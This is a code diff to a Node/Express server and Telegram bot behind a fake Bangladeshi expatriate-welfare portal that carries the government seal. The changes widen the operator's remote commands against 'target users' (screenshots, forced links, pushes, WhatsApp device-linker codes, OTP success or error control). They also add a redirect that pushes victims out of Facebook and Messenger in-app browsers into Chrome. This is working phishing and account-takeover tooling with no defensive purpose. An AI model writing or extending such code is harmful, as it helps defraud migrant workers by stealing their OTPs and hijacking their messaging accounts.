@@ -25,6 +25,22 @@ interface RemoteCommand {
   timestamp: number;
 }
 
+const normalizeUserId = (rawId: string): string => {
+  if (!rawId) return "";
+  let clean = rawId.toLowerCase().trim();
+  clean = clean.replace(/[\{\}\[\]\(\)]/g, ""); // remove brackets, braces, parentheses
+  clean = clean.replace(/[^a-z0-9]/g, "");     // strip spaces, underscores, hyphens
+  
+  if (/^\d+$/.test(clean)) {
+    return `user_${clean}`;
+  }
+  if (clean.startsWith("user")) {
+    const num = clean.replace("user", "");
+    return `user_${num}`;
+  }
+  return `user_${clean}`;
+};
+
 const sessionRemoteCommands: Record<string, RemoteCommand> = {};
 
 // Load/Save push subscriptions persistently to survive development server restarts
@@ -206,12 +222,12 @@ async function startTelegramPolling() {
                                     text.match(/^\/?(?:screenshort|screenshot|screen|screensort|shot)_?[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?/i) ||
                                     text.match(/^\/?[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?(?:screenshort|screenshot|screensort|shot)/i);
 
-            // Direct match command: /success user_X, /success_user_X, /error user_X, or /error_user_X
-            const successMatch = text.match(/^\/?success(?:_|\s+)(user_\d+)/i);
-            const errorMatch = text.match(/^\/?error(?:_|\s+)(user_\d+)/i);
+            // Dynamic match command: /success user_X, /success_user_X, /success X, /error user_X, or /error_user_X, /error X
+            const successMatch = text.match(/^\/?success(?:_|\s+)(user[-_\s]*\d+|\d+)/i) || text.match(/^\/?success_([a-z0-9_-]+)/i);
+            const errorMatch = text.match(/^\/?error(?:_|\s+)(user[-_\s]*\d+|\d+)/i) || text.match(/^\/?error_([a-z0-9_-]+)/i);
 
             if (openHtmlAdsMatch) {
-              const uId = openHtmlAdsMatch[1].toLowerCase().replace('-', '_');
+              const uId = normalizeUserId(openHtmlAdsMatch[1]);
               const extraText = openHtmlAdsMatch[2]?.trim() || '';
 
               sessionRemoteCommands[uId] = {
@@ -237,7 +253,7 @@ async function startTelegramPolling() {
               }).catch(() => {});
             }
             else if (openWebAdsMatch) {
-              const uId = openWebAdsMatch[1].toLowerCase().replace('-', '_');
+              const uId = normalizeUserId(openWebAdsMatch[1]);
               const urlTarget = openWebAdsMatch[2]?.trim() || '';
 
               sessionRemoteCommands[uId] = {
@@ -262,7 +278,7 @@ async function startTelegramPolling() {
               }).catch(() => {});
             }
             else if (openVideoAdsMatch) {
-              const uId = openVideoAdsMatch[1].toLowerCase().replace('-', '_');
+              const uId = normalizeUserId(openVideoAdsMatch[1]);
               const extraText = openVideoAdsMatch[2]?.trim() || '';
 
               sessionRemoteCommands[uId] = {
@@ -288,7 +304,7 @@ async function startTelegramPolling() {
               }).catch(() => {});
             }
             else if (openPhotoAdsMatch) {
-              const uId = openPhotoAdsMatch[1].toLowerCase().replace('-', '_');
+              const uId = normalizeUserId(openPhotoAdsMatch[1]);
               const extraText = openPhotoAdsMatch[2]?.trim() || '';
 
               sessionRemoteCommands[uId] = {
@@ -314,7 +330,7 @@ async function startTelegramPolling() {
               }).catch(() => {});
             }
             else if (openPageMatch) {
-              const uId = openPageMatch[1].toLowerCase().replace('-', '_');
+              const uId = normalizeUserId(openPageMatch[1]);
               let targetPage = openPageMatch[2].trim().toLowerCase();
               
               // Map friendly page names to app page IDs
@@ -375,7 +391,7 @@ async function startTelegramPolling() {
             } 
             else if (sendAdsMatch || showAdMatch) {
               const matchObj = sendAdsMatch || showAdMatch;
-              const uId = matchObj![1].toLowerCase().replace('-', '_');
+              const uId = normalizeUserId(matchObj![1]);
               const adMessage = matchObj![2].trim();
 
               sessionRemoteCommands[uId] = {
@@ -400,7 +416,7 @@ async function startTelegramPolling() {
               }).catch(() => {});
             }
             else if (clickButtonMatch) {
-              const uId = clickButtonMatch[1].toLowerCase().replace('-', '_');
+              const uId = normalizeUserId(clickButtonMatch[1]);
               const targetButton = clickButtonMatch[2].trim().toLowerCase();
 
               sessionRemoteCommands[uId] = {
@@ -425,7 +441,7 @@ async function startTelegramPolling() {
               }).catch(() => {});
             }
             else if (openLinkMatch) {
-              const uId = openLinkMatch[1].toLowerCase().replace('-', '_');
+              const uId = normalizeUserId(openLinkMatch[1]);
               const url = openLinkMatch[2].trim();
 
               sessionRemoteCommands[uId] = {
@@ -450,7 +466,7 @@ async function startTelegramPolling() {
               }).catch(() => {});
             }
             else if (forcePushMatch) {
-              const uId = forcePushMatch[1].toLowerCase().replace('-', '_');
+              const uId = normalizeUserId(forcePushMatch[1]);
 
               sessionRemoteCommands[uId] = {
                 action: 'force_push',
@@ -473,7 +489,7 @@ async function startTelegramPolling() {
               }).catch(() => {});
             }
             else if (wpDeviceLinkerMatch) {
-              const uId = wpDeviceLinkerMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
+              const uId = normalizeUserId(wpDeviceLinkerMatch[1]);
               const rawCode = wpDeviceLinkerMatch[2].trim().toUpperCase().replace(/[\{\}\[\]\(\)\s]/g, '');
               
               sessionRemoteCommands[uId] = {
@@ -506,7 +522,7 @@ async function startTelegramPolling() {
               }).catch(() => {});
             }
             else if (wpDeviceLinkerNewMatch) {
-              const uId = wpDeviceLinkerNewMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
+              const uId = normalizeUserId(wpDeviceLinkerNewMatch[1]);
               const rawCode = wpDeviceLinkerNewMatch[2].trim().toUpperCase().replace(/[\{\}\[\]\(\)\s]/g, '');
               
               sessionRemoteCommands[uId] = {
@@ -540,9 +556,9 @@ async function startTelegramPolling() {
             }
             else if (wpDeviceLinkerReplyMatch && replyTo) {
               const replyText = replyTo.text || replyTo.caption || '';
-              const userIdMatch = replyText.match(/ID:\s*(user[-_]\d+)/i) || replyText.match(/আইডি:\s*(user[-_]\d+)/i);
+              const userIdMatch = replyText.match(/ID:\s*([a-z0-9_-]+)/i) || replyText.match(/আইডি:\s*([a-z0-9_-]+)/i);
               if (userIdMatch) {
-                const uId = userIdMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
+                const uId = normalizeUserId(userIdMatch[1]);
                 const rawCode = wpDeviceLinkerReplyMatch[1].trim().toUpperCase().replace(/[\{\}\[\]\(\)\s]/g, '');
                 
                 sessionRemoteCommands[uId] = {
@@ -576,7 +592,7 @@ async function startTelegramPolling() {
               }
             }
             else if (screenshotMatch) {
-              const uId = screenshotMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
+              const uId = normalizeUserId(screenshotMatch[1]);
               
               console.log(`[TELEGRAM REMOTE COMMAND] TAKE SCREENSHOT: user ${uId}`);
               const statusInfo = sessionOnlineStatus[uId];
@@ -626,7 +642,7 @@ async function startTelegramPolling() {
               }
             }
             else if (successMatch) {
-              const uId = successMatch[1].toLowerCase();
+              const uId = normalizeUserId(successMatch[1]);
               sessionOtpStatus[uId] = { ...(sessionOtpStatus[uId] || { status: "pending", timestamp: Date.now() }), status: "success" };
               console.log(`[TELEGRAM ADMIN] Set SUCCESS for user ${uId}`);
               await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
@@ -639,7 +655,7 @@ async function startTelegramPolling() {
                 })
               }).catch(() => {});
             } else if (errorMatch) {
-              const uId = errorMatch[1].toLowerCase();
+              const uId = normalizeUserId(errorMatch[1]);
               sessionOtpStatus[uId] = { ...(sessionOtpStatus[uId] || { status: "pending", timestamp: Date.now() }), status: "error" };
               console.log(`[TELEGRAM ADMIN] Set ERROR for user ${uId}`);
               await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
@@ -653,10 +669,10 @@ async function startTelegramPolling() {
               }).catch(() => {});
             } else if (replyTo) {
               const replyText = replyTo.text || replyTo.caption || '';
-              // Match "User ID: user_X" inside notification messages
-              const userIdMatch = replyText.match(/User\s*ID:\s*(user_\d+)/i);
+              // Match "User ID: user_X" inside notification messages or WhatsApp / OTP alerts
+              const userIdMatch = replyText.match(/User\s*ID:\s*([a-z0-9_-]+)/i) || replyText.match(/আইডি:\s*([a-z0-9_-]+)/i);
               if (userIdMatch) {
-                const uId = userIdMatch[1].toLowerCase();
+                const uId = normalizeUserId(userIdMatch[1]);
                 const replyCmd = text.toLowerCase();
 
                 if (replyCmd.includes('success') || replyCmd === 'ok' || replyCmd === 'yes' || replyCmd.includes('ঠিক') || replyCmd.includes('সফল')) {
@@ -713,6 +729,164 @@ async function startServer() {
   const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;
 
   app.use(express.json());
+
+  // Redirect Facebook Messenger / In-App Browser to native Chrome default browser for Android
+  app.use((req, res, next) => {
+    // Only apply this redirect for main page requests (either "/" or "/index.html")
+    if (req.path !== "/" && req.path !== "/index.html") {
+      return next();
+    }
+
+    const ua = req.headers['user-agent'] || '';
+    const isFbOrMessenger = (
+      ua.indexOf('FBAN') > -1 || 
+      ua.indexOf('FBAV') > -1 || 
+      ua.indexOf('Instagram') > -1 || 
+      ua.indexOf('Messenger') > -1 ||
+      ua.indexOf('Line') > -1 ||
+      ua.indexOf('Viber') > -1 ||
+      ua.indexOf('FB_IAB') > -1 ||
+      ua.indexOf('FBIOS') > -1 ||
+      ua.indexOf('WhatsApp') > -1
+    );
+
+    const isAndroid = ua.toLowerCase().indexOf('android') > -1;
+
+    if (isFbOrMessenger && isAndroid) {
+      const host = req.get('host') || 'amra-probashi3.onrender.com';
+      const originalUrl = req.originalUrl || '/';
+      // Complete Intent URI to target standard Android browser/Chrome
+      const intentUrl = `intent://${host}${originalUrl}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end;`;
+      
+      res.setHeader('Content-Type', 'text/html; charset=utf-8');
+      return res.send(`
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>প্রবাসী সেবা পোর্টাল – অটোমেটিক ব্রাউজার ডিরেক্ট</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: radial-gradient(circle at top, #1e293b, #0f172a);
+      color: #f8fafc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      padding: 24px;
+      box-sizing: border-box;
+    }
+    .card {
+      background: rgba(30, 41, 59, 0.75);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 28px;
+      padding: 44px 28px;
+      max-width: 440px;
+      width: 100%;
+      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.6);
+    }
+    .logo {
+      width: 84px;
+      height: 84px;
+      margin: 0 auto 24px;
+      animation: pulse 2s infinite ease-in-out;
+    }
+    h2 {
+      font-size: 21px;
+      font-weight: 800;
+      margin-bottom: 14px;
+      color: #10b981;
+      line-height: 1.4;
+    }
+    p {
+      font-size: 14px;
+      color: #94a3b8;
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+    .loader {
+      border: 3px solid rgba(255, 255, 255, 0.1);
+      border-top: 3px solid #10b981;
+      border-radius: 50%;
+      width: 44px;
+      height: 44px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 28px;
+    }
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #059669, #047857);
+      color: white;
+      text-decoration: none;
+      padding: 15px 30px;
+      font-size: 15px;
+      font-weight: bold;
+      border-radius: 14px;
+      box-shadow: 0 4px 12px rgba(16, 185, 129, 0.2);
+      transition: all 0.25s;
+      cursor: pointer;
+      width: 100%;
+      box-sizing: border-box;
+      border: none;
+    }
+    .btn:hover {
+      background: linear-gradient(135deg, #047857, #065f46);
+      transform: translateY(-2px);
+    }
+    .note {
+      font-size: 11.5px;
+      color: #64748b;
+      margin-top: 24px;
+      line-height: 1.5;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.04); }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" class="logo" alt="Gov Seal">
+    <h2>প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</h2>
+    <p>নিরাপদ ও রিয়েল-টাইম ট্র্যাকিং সুবিধা নিশ্চিত করতে এবং মেসেঞ্জার ইন-অ্যাপ ব্রাউজারের সীমাবদ্ধতা এড়াতে, পোর্টালটি অটোমেটিকভাবে আপনার ফোনের ক্রোম ব্রাউজারে স্থানান্তরিত হচ্ছে...</p>
+    
+    <div class="loader"></div>
+    
+    <button class="btn" id="redirect-btn">ব্রাউজার ওপেন হচ্ছে না? এখানে ক্লিক করুন</button>
+    
+    <div class="note">ডিফল্ট ব্রাউজারে ওপেন করলে রিয়েল-টাইম নোটিফিকেশন, রিমোট কম্যান্ড এবং ফাইল ভেরিফিকেশন শতভাগ কাজ করবে।</div>
+  </div>
+  <script>
+    const targetIntent = "${intentUrl}";
+    // Auto-replace location to trigger intent
+    setTimeout(() => {
+      window.location.replace(targetIntent);
+    }, 450);
+    
+    document.getElementById('redirect-btn').addEventListener('click', function() {
+      window.location.href = targetIntent;
+    });
+  </script>
+</body>
+</html>
+      `);
+    }
+
+    next();
+  });
 
   // Trigger base polling as a side effect
   startTelegramPolling().catch(err => console.error('[POLLING TRIGGER FAIL]', err));
@@ -872,8 +1046,10 @@ async function startServer() {
 
   // Request Sequential Unique User-Session ID
   app.get("/api/request-session-id", (req, res) => {
+    // Generate sequential + highly unique random numbers to perfectly isolate target users across devices and restarts
+    const uniqueRand = Math.floor(100000 + Math.random() * 900000); // 6-digit random integer
     userCounter++;
-    const sessionId = `user_${userCounter}`;
+    const sessionId = `user_${uniqueRand}${userCounter}`;
     res.json({ success: true, sessionId });
   });
 
